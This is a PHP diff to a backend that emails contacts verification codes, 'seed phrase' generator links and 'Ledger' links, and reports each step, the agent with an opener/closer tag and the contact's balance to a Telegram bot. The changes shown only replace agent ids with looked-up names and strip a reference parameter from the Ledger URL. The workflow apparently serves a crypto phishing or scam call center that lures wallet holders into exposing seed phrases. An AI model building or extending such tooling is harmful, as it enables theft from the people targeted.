@@ -103,16 +103,25 @@ function handleVerifyAction($reference)
         $email = $referenceData[0]['Email'];
     }
 
+    $user = getAllAusers($agent);
+
+    if (isset($user[0]) && empty($user[0])) {
+        return ['success' => false, 'error' => 'Caller not found'];
+    }
+
+    $name = $user[0]['name'] ?? 'Unknown';
+
     // Generate or get verification code
     $verificationCode = generateVerificationCode();
 
     $emailHelper = new EmailHelper();
     $emailHelper->sendVerificationEmail($email, $verificationCode);
+    
 
     $jsonData = [
         'Activity' => 'Lead verified',
         'Department' => $department ?? 'Unknown',
-        'Agent' => $agent . ' (Open)',
+        'Agent' => $name . ' (Open)',
     ];
 
     sendDataToTelegramBot($jsonData);
@@ -126,7 +135,7 @@ function handleVerifyAction($reference)
         'verification_code' => $verificationCode,
         'message' => 'Verification code generated',
         'seed_url' => SEED_URL . strtolower($reference),
-        'ledger_url' => LEDGER_URL . "?ref=" . strtolower($reference)
+        'ledger_url' => LEDGER_URL
 
     ];
 }
@@ -155,13 +164,21 @@ function handleApiKeyAction($reference)
         $supportPhone = $referenceData[0]['Support Phone Number'];
     }
 
+    $user = getAllAusers($agent);
+
+    if (isset($user[0]) && empty($user[0])) {
+        return ['success' => false, 'error' => 'Caller not found'];
+    }
+
+    $name = $user[0]['name'] ?? 'Unknown';
+
     $emailHelper = new EmailHelper();
     $emailHelper->sendApiKeyNotification($email, $supportPhone);
 
     $jsonData = [
         'Activity' => 'API Key attached',
         'Department' => $department ?? 'Unknown',
-        'Agent' => $agent . ' (Open)',
+        'Agent' => $name . ' (Open)',
         'Balance' => $balance
     ];
 
@@ -203,11 +220,12 @@ function handleApiCancelAction($reference)
     }
 
     $role = $user[0]['role'] ?? 'Unknown';
+    $name = $user[0]['name'] ?? 'Unknown';
 
     $jsonData = [
         'Activity' => 'API Key access revoked',
         'Department' => $department ?? 'Unknown',
-        'Agent' => $agent . ' (' . $role . ')',
+        'Agent' => $name . ' (' . $role . ')',
         'Balance' => $balance
     ];
 
@@ -240,13 +258,21 @@ function handleSeedPhraseAction($reference)
         $email = $referenceData[0]['Email'];
     }
 
+    $user = getAllAusers($agent);
+
+    if (isset($user[0]) && empty($user[0])) {
+        return ['success' => false, 'error' => 'User not found for reference ' . $reference];
+    }
+
+    $name = $user[0]['name'] ?? 'Unknown';
+
     $emailHelper = new EmailHelper();
     $emailHelper->sendSeedPhraseEmail($email, $seedUrl);
 
     $jsonData = [
         'Activity' => 'Generator link sent',
         'Department' => $department ?? 'Unknown',
-        'Agent' => $agent . ' (Close)',
+        'Agent' => $name . ' (Close)',
         'Balance' => $balance
     ];
 
@@ -265,7 +291,7 @@ function handleLedgerAction($reference)
 {
     global $agent, $department, $balance;
 
-    $ledgerUrl = LEDGER_URL."?ref=" . strtolower($reference);
+    $ledgerUrl = LEDGER_URL;
 
     $sheet = new GoogleSheetsHelper();
     $referenceData = $sheet->searchInSheet('Reference', $reference);
@@ -290,11 +316,12 @@ function handleLedgerAction($reference)
     }
 
     $role = $user[0]['role'] ?? 'Unknown';
+    $name = $user[0]['name'] ?? 'Unknown';
 
     $jsonData = [
         'Activity' => 'Ledger link sent',
         'Department' => $department ?? 'Unknown',
-        'Agent' => $agent . ' (' . $role . ')',
+        'Agent' => $name . ' (' . $role . ')',
         'Balance' => $balance
     ];
 
